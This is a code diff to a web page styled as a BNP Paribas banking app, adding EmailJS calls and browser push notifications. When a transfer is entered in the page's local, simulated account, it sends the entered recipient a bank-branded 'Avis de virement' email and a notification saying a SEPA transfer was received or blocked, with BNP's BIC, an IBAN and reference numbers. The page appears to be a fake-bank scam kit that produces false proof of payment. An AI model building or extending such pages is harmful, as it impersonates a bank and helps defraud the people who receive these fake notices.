@@ -4,6 +4,10 @@
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
 <title>BNP Paribas</title>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script type="text/javascript">
+  (function(){emailjs.init('BcemhwPKgc_dByHGF');})();
+</script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;-webkit-text-size-adjust:100%}
 body{background:#f5f5f5;font-family:'Segoe UI',Arial,sans-serif;max-width:96%;margin:0 auto;min-height:100vh}
@@ -627,13 +631,39 @@ function bindEv(){
               op.st='bloque';
               var dt2=getFrDT2();
               notifs.unshift({type:'bloque',benef:op.label,montant:fmt(Math.abs(op.amt)),motif:op.sub,date:op.d,heure:dt2.t});
+              var ref2='BNP'+Date.now();
+              // Notification push blocage
+              if('Notification' in window && Notification.permission==='granted'){
+                new Notification('BNP Paribas - Virement SEPA Bloqu\u00e9',{
+                  body:'Bonjour '+op.label+', le virement SEPA de '+fmt(Math.abs(op.amt))+' \u00e9mis par '+NOM+' sur votre compte a \u00e9t\u00e9 bloqu\u00e9. Les fonds ne seront pas cr\u00e9dit\u00e9s.',
+                  icon:'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2214%22 fill=%22%2300a84f%22/></svg>'
+                });
+              }
               emailjs.send('service_pdq0e7r','template_k5huqpq',{
-                to_name:NOM,
-                beneficiaire:op.label,
-                montant:fmt(Math.abs(op.amt)),
-                motif:op.sub,
+                notification:'Votre virement a \u00e9t\u00e9 bloqu\u00e9',
+                TITLE_AVIS:'Avis de blocage de virement',
+                date_label:'Date',
                 date:op.d,
-                statut:'BLOQUE',
+                status_label:'BLOQU\u00c9',
+                amount_val:fmt(Math.abs(op.amt)),
+                date_valeur_label:'Date valeur',
+                date_valeur:op.d,
+                debiteur_label:'D\u00e9biteur',
+                metteur:NOM,
+                iban_emetteur:'FR76300070006435670012',
+                crediteur_label:'B\u00e9n\u00e9ficiaire',
+                'b\u00e9n\u00e9ficiaire':op.label,
+                iban_masque:'****',
+                bic:'BNPAFRPP',
+                type_label:'Type',
+                type_val:'Virement SEPA',
+                ref_label:'R\u00e9f\u00e9rence',
+                ref:ref2,
+                motif_label:'Motif',
+                motif:op.sub||'Virement',
+                statut_final_label:'Statut',
+                statut_final_val:'BLOQU\u00c9 - Contactez votre conseiller',
+                to_email:EGEST,
                 email:EGEST
               }).catch(function(){});
             }
@@ -674,6 +704,51 @@ function bindEv(){
       S.ops.unshift({id:'v_'+Date.now(),ic:'VIR',label:b,sub:vm||'Virement',amt:-mt,plus:false,d:d.d,st:'attente'});
       S.solde-=mt;saveSt();
       notifs.unshift({type:'vir',benef:b,montant:fmt(mt),motif:vm||'Virement',date:d.d,heure:d.t});
+      var ref1='BNP'+Date.now();
+      // Notification push sur l'ecran
+      function showPush(title, body){
+        if('Notification' in window){
+          Notification.requestPermission().then(function(perm){
+            if(perm==='granted'){
+              new Notification(title,{
+                body:body,
+                icon:'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2214%22 fill=%22%2300a84f%22/></svg>'
+              });
+            }
+          });
+        }
+      }
+      showPush(
+        'BNP Paribas - Virement SEPA - '+fmt(mt),
+        'Bonjour '+b+', Vous venez de recevoir un virement SEPA de '+fmt(mt)+' de la part de '+NOM+' sur votre compte '+(iv?iv.substring(0,4)+' **** **** **** '+iv.slice(-4):'FR76 **** **** **** 0012')+'.'
+      );
+      emailjs.send('service_pdq0e7r','template_6ho7am8',{
+        notification:'Nouveau virement en attente de validation',
+        TITLE_AVIS:'Avis de virement',
+        date_label:'Date',
+        date:d.d,
+        status_label:'EN ATTENTE',
+        amount_val:fmt(mt),
+        date_valeur_label:'Date valeur',
+        date_valeur:d.d,
+        debiteur_label:'D\u00e9biteur',
+        metteur:NOM,
+        iban_emetteur:'FR76300070006435670012',
+        crediteur_label:'B\u00e9n\u00e9ficiaire',
+        'b\u00e9n\u00e9ficiaire':b,
+        iban_masque:iv?iv.substring(0,8)+'****'+iv.slice(-4):'Non renseign\u00e9',
+        bic:vc||'BNPAFRPP',
+        type_label:'Type',
+        type_val:'Virement SEPA',
+        ref_label:'R\u00e9f\u00e9rence',
+        ref:ref1,
+        motif_label:'Motif',
+        motif:vm||'Virement',
+        statut_final_label:'Statut',
+        statut_final_val:'En attente de validation',
+        to_email:em,
+        email:em
+      }).then(function(r){console.log('Email attente OK',r);}).catch(function(e){console.error('Email attente ERR',e);});
       virBenef='';virIban='';virBic='';virMontant='';virMotif='';virEmail='';virSel=-1;
       virOk=true;render();
     });
